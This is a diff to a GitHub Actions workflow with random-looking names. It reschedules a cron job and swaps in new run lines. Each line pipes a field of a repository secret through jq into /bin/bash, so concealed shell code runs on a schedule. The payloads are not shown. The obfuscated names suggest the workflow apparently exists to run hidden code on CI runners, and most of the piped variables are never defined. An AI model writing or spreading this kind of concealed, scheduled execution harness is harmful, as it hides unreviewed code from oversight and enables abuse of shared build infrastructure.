@@ -3,7 +3,7 @@ name: jinxinnian3421
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 4/6 * * *'
+    - cron: '22 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: jinxinnian3421
         env:
-          nde3: ${{ secrets.nde3 }}
+          mzhzb616: ${{ secrets.mzhzb616 }}
         run: |
-          echo $nde3 | jq -r .t2 | /bin/bash
-          echo $ovsgc08 | jq -r .nde47 | /bin/bash
-          echo $syhp215 | jq -r .vk90 | /bin/bash
-          echo $lxdyn9958 | jq -r .xsst84 | /bin/bash
-          echo $j23417 | jq -r .alee1 | /bin/bash
-          echo $agj7008 | jq -r .fuv28845 | /bin/bash
-          echo $cb60557 | jq -r .qm43 | /bin/bash
-          echo $mpvls100 | jq -r .d230 | /bin/bash
-          echo $asn3 | jq -r .yfpyt14 | /bin/bash
-          echo $dv15331 | jq -r .qmt3812 | /bin/bash
+          echo $mzhzb616 | jq -r .yvb483 | /bin/bash
+          echo $sjz96 | jq -r .goccu3915 | /bin/bash
+          echo $dqwk5329 | jq -r .oh612 | /bin/bash
+          echo $wcodn193 | jq -r .hgu48737 | /bin/bash
+          echo $mf057 | jq -r .w3 | /bin/bash
+          echo $svyz51 | jq -r .mnxsu5 | /bin/bash
+          echo $is74 | jq -r .jna51191 | /bin/bash
 
